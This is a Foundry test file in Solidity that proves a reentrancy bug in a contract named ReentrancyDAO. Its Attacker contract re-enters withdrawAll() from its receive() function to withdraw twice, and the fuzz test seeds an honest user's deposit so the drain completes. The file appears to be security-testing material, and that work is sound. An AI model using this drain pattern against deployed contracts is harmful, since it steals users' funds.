
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {
    ReentrancyDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal > 0.1 ether && attackVal < 100 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // We need to fund the contract with an honest user first.
        // This is critical because ReentrancyDAO subtracts from 'balance' (uint) BEFORE the call.
        // If the contract only holds the attacker's funds, the re-entrant call will cause an 
        // arithmetic underflow on 'balance -= oCredit' (since 0.8.x checks for overflow/underflow),
        // causing the attack to revert.
        address honestUser = address(0xCAFE);
        vm.deal(honestUser, attackVal * 10);
        vm.prank(honestUser);
        _contractUnderTest.deposit{value: attackVal * 5}();

        // --- 3. Funding ---
        // A. Fund the Victim (Already done via honest deposit, but ensuring EVM balance matches)
        // The deposit above handles the state variable 'balance'.
        
        // B. Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // C. Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    ReentrancyDAO public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) { 
        victim = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        // Deposit funds to establish credit
        victim.deposit{value: val}();
    }

    function attack(uint256 val) public {
        uint256 startBalance = address(this).balance;

        // Call the vulnerable function
        victim.withdrawAll();

        uint256 endBalance = address(this).balance;

        // Verify Success Conditions
        // If we successfully re-entered, we withdrew 'val' twice (once normally, once via reentrancy).
        // Therefore, our balance should have increased by roughly 2 * val.
        if (endBalance >= startBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract
            victim.withdrawAll();
        }
    }

    fallback() external payable {}
}
